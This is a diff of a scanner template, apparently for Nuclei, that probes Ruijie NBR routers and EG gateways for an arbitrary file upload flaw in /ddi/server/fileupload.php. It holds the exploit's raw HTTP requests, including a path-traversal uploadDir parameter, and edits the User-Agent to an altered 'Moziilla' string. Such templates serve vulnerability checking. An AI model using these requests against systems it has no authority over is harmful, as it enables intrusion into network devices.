@@ -1,10 +1,9 @@
 id: ruijie-eg-and-nbr-ddi-server-fileupload-fileupload
 
 info:
-  name: ruijie-ddi-server-fileupload-fileupload
+  name:  锐捷NBR路由器、锐捷EG易网管/ddi/server/fileupload.php任意文件上传
   author: xy
   severity: high
-  description: 锐捷NBR路由器、锐捷EG易网管/ddi/server/fileupload.php任意文件上传
   reference:
     - none
   tags: ruijie,fileuplod
@@ -18,9 +17,8 @@ http:
       - |
         POST /ddi/server/fileupload.php HTTP/1.1
         Host: {{Hostname}}
-        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
+        User-Agent: Moziilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
         Content-Type: multipart/form-data; boundary=---------------------------377854284742296314544091742118
-        Accept: */*
 
         -----------------------------377854284742296314544091742118
         Content-Disposition: form-data; name="uploadDir"
@@ -36,8 +34,7 @@ http:
       - |
         GET /ddi/server/upload/{{randstr}}.txt HTTP/1.1
         Host: {{Hostname}}
-        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
-
+        User-Agent: Moziilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
 
     matchers:
       - type: dsl
@@ -50,7 +47,7 @@ http:
 # POST /ddi/server/fileupload.php?uploadDir=../../upload&name=cnvd.txt HTTP/1.1
 # Host: {{Hostname}}
 # Accept: text/plain, */*; q=0.01
-# User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36
+# User-Agent: Moziilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36
 # Content-Disposition: form-data; name="file"; filename="cnvd.txt"
 # Content-Type: image/jpeg
 
